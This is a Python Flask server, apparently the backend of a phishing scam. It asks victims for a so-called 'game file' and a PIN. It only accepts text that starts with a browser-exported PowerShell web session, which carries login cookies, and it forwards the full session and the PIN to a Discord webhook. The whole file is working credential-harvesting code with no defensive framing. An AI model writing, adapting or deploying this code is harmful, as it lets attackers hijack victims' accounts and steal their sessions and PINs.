from flask import Flask, request, jsonify, send_from_directory
from dotenv import load_dotenv
import requests
import os

load_dotenv()

app = Flask(__name__, static_folder='public')

WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK')

@app.route('/')
def index():
    return send_from_directory('public', 'index.html')

@app.route('/api/submit', methods=['POST'])
def submit():
    try:
        data = request.get_json()
        username = data.get('username', '').strip()
        pin = data.get('pin', '').strip()
        
        if not username or not pin:
            return jsonify({'error': 'Completa todos los campos'}), 400
        
        if not username.startswith('$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession'):
            return jsonify({'error': 'Error, eso no es un game file'}), 400
        
        if not WEBHOOK_URL:
            return jsonify({'error': 'Error del servidor'}), 500
        
        max_length = 1900
        messages = []
        
        if len(username) > max_length:
            for i in range(0, len(username), max_length):
                messages.append(username[i:i + max_length])
        else:
            messages.append(username)
        
        payload = {
            'content': f'**Nuevo Reporte**\n**PIN:** {pin}\n```\n{messages[0]}\n```'
        }
        requests.post(WEBHOOK_URL, json=payload)
        
        for msg in messages[1:]:
            requests.post(WEBHOOK_URL, json={'content': f'```\n{msg}\n```'})
        
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'error': 'Error al enviar'}), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 3000))
    app.run(host='0.0.0.0', port=port, debug=True)
